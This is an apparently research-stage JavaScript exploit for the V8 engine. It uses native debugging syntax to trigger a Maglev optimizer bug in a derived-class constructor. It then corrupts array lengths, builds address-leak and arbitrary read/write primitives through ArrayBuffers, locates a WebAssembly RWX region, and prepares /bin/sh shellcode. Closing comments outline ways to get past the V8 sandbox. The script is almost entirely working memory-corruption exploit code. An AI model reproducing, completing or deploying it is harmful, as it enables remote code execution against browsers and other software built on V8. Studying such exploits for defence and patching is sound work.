class Helpers {
  constructor () {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;

  }

  nop_nop() {

  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }
  print_hex(f) {
    console.log('0x' + this.f64toi64(f).toString(16));
  }
  hex_to_dbl(hexString) {
    if (hexString.startsWith('0x')) {
      hexString = hexString.substring(2);
    }

    for (let i = 0; i < 8; i++) {
      const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
      this.u8[i] = parseInt(byte, 16);
    }

    const float64 = new Float64Array(this.u8.buffer);
    return float64[0];
  }
  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[1]
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[0]
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (var i = 0; i < 8; i++) {
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }
  trap() {
    while (1) {
    }
  }
}
var helper = new Helpers();

var v;
var empty_object = {};
let zero = 0;
let corrupted_instance = null;

let a_addr = 0
let rwarr = null;
let rwarr_addr = 0
let rwarr_storage_idx = 0;

let changer = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let leaker = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
let holder = { p1: 0x1234, p2: 0x1234, p3: 0x1234 };
let original_holder_bytes = 0;

let arrBuff1 = new ArrayBuffer(1024);
let arrBuff2 = new ArrayBuffer(1024);

class A { }
class B extends A {
  constructor () {
    v = new.target;
    let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
    super();
    gc();
    let floatArr = [1.1];

    this.x = objArr;
    this.a = floatArr;
  }
}

function gc() {
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function debug_print(name, obj) {
  console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function addrOf_tmp(obj) {
  corrupted_instance.x[0] = obj;               // x holds objects that need to be leaked
  helper.f64[0] = corrupted_instance.a[0];     // set ArrayBuffer with the first element of a, which point to the object  
  return helper.u32[0];                    // get the last 32 bits of the address due to pointer compression
}

// These functions use `where-in` because v8
// needs to jump over the map and size words
function write_temp(where, what) {
  helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
  if (helper.u32[0] == 0x6) {
    helper.f64[0] = corrupted_instance.a[rwarr_storage_idx - 1];
    helper.u32[1] = where - 8; // don't know why -8
    corrupted_instance.a[rwarr_storage_idx - 1] = helper.f64[0];
  } else if (helper.u32[1] == 0x6) {
    helper.u32[0] = where - 8;
    corrupted_instance.a[rwarr_storage_idx] = helper.f64[0];
  }
  rwarr[0] = what;
}

function exploit() {
  print("[+] Triggering GC for moving GC-resistance objects into old space...");
  for (let i = 0; i < 100; i++) {
    if (i < 90) gc();
  }

  print("[+] Triggering the bug...");
  for (let i = 0; i < 100; i++) {
    if (i < 90) gc();
  }

  % PrepareFunctionForOptimization(B);
  corrupted_instance = new B();

  for (let i = 0; i < 100; i++) {
    % OptimizeMaglevOnNextCall(B);
    corrupted_instance = new B();
  }

  print("[+] Corrupting the metadata (length) of corrupted_instance.a ..");
  while(corrupted_instance.a.length != 0x10000000) {
    corrupted_instance.x[5] = 0x10000000; // need to be bigger for covering the whole memory
    print(`[+] Expected: ${0x10000000}, got: ${corrupted_instance.a.length}`);
  }
  print(`[+] Initial corruption succeeded!`);

  while (true) {
    rwarr = [1.1, 2.2, 3.3];
    rwarr_addr = addrOf_tmp(rwarr);
    buff_addr = addrOf_tmp(corrupted_instance.a);

    if (rwarr_addr < buff_addr) {
    } else {
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - buff_addr) + 0xc;
      if ((offset % 8) != 0) {
        offset -= 4;
      }
      print("[+] Offset: " + offset);

      print("[+] Calculating the index...");
      rwarr_storage_idx = offset / 8;
      rwarr_storage_idx += 1;
      print("[+] Index: " + rwarr_storage_idx);

      helper.f64[0] = corrupted_instance.a[rwarr_storage_idx];
      // print("[+] The approximately view of pointer's data: 0x"
      //     + helper.u32[0].toString(16) + " 0x"
      //     + helper.u32[1].toString(16)); // value can be in u32[0] or u32[1]
      break;
    }
  }

  print("[+] Get ArrayBuffer 1 and ArrayBuffer 2 addresses...")
  let arrBuff1Address = addrOf_tmp(arrBuff1);
  print(`[+] ArrayBuffer 1 address: 0x${arrBuff1Address.toString(16)}`);
  // debug_print('arrBuff1', arrBuff1);
  
  let arrBuff2Address = addrOf_tmp(arrBuff2);
  print(`[+] ArrayBuffer 2 address: 0x${arrBuff2Address.toString(16)}`);
  // debug_print('arrBuff2', arrBuff2);

  helper.u32[1] = 0; helper.u32[0] = arrBuff2Address - 2;
  print("[+] Corrupting ArrayBuffer 1 backing storage address ...");
  write_temp(arrBuff1Address - 1 + 0x24, helper.f64[0]);
  // debug_print('arrBuff1', arrBuff1);
  
  let view1 = new Uint32Array(arrBuff1);
  // for (let i = 0; i < 0x10; i++) {
  //   print(`[+] arrBuff1[${i}] = 0x${view1[i].toString(16)}`);
  // }

  print("[+] Adjusting 2nd buffer's backing store offset ...");
  view1[10] &= 0xffffff00;

  print("[+] Constructing primitives...");

  function read32(addr) {
    helper.f64[0] = helper.hex_to_dbl('0x' + addr.toString(16));
    view1[9] = helper.u32[0];
    let view2 = new Uint32Array(arrBuff2);
    return view2[0];
  }

  // print("[+] Reading data from 2nd buffer address...");
  // let readData = read32(arrBuff2Address - 1);
  // print(`[+] Read data from 2nd buffer address: 0x${readData.toString(16)}`);
  // debug_print('arrBuff2', arrBuff2);

  function write32(addr, value) {
    helper.f64[0] = helper.hex_to_dbl('0x' + addr.toString(16));
    view1[9] = helper.u32[0];
    let view2 = new Uint32Array(arrBuff2);
    view2[0] = value;
  }

  // print("[+] Writing elements pointer of 2nd buffer address...");
  // write32(arrBuff2Address - 1 + 0x8, 0x13371337); // Validate with GDB because if we debug print, it will crash
  
  function addrOf(obj) {
    arrBuff2.leakMe = obj;
    let props = read32(arrBuff2Address - 1 + 0x4) - 1;
    return read32(props + 0x8) - 1;
  }

  // let obj = { a: 1 };
  // print("[+] Leaking the object address...");
  // let obj_addr = addrOf(obj);
  // print(`[+] Leaked object address: 0x${obj_addr.toString(16)}`);

  print("[+] Constructed primitives!");

  print("[+] Fixing corrupted fields...");
  corrupted_instance.x.length = 0;
  corrupted_instance.a.length = 0;
  rwarr.length = 0;

  var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule);
  var func = wasmInstance.exports.main; // point to the main function

  let wasmInstanceAddress = addrOf(wasmInstance);
  print(`[+] WASM Instance address: 0x${wasmInstanceAddress.toString(16)}`);
  debug_print('wasmInstance', wasmInstance);
  
  let wasmRwxOffset = 0x4c;
  let wasmRWXAddressLow = read32(wasmInstanceAddress + wasmRwxOffset - 4);
  let wasmRWXAddressHigh = read32(wasmInstanceAddress + wasmRwxOffset);
  print(`[+] RWX Memory address: 0x${wasmRWXAddressHigh.toString(16)}${wasmRWXAddressLow.toString(16)}`);
  
  print("[+] Preparing Shellcode...");
  let shellcode = new Uint8Array([
      0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05
  ]);

  // Stuck: 
  // - The backing store of array buffer is just the offset instead of the raw address -> this is due to something called sandbox.
  // - So, the read-write can only read or write 4 bytes and in the memory range from isolate to array buffers.
  // With sandbox:
  // - 1. Try to get the isolate root pointer
  // - 2. Recreate wasm instance until it lies after the array buffers, identified by get the distance between wasm and array buffers which are decompressed by adding with isolate root pointer
  // Without sandbox:
  // - 1. Rewrite primitives
  // - 2. Write the jump table directly to the backing store of array buffer
}

exploit();
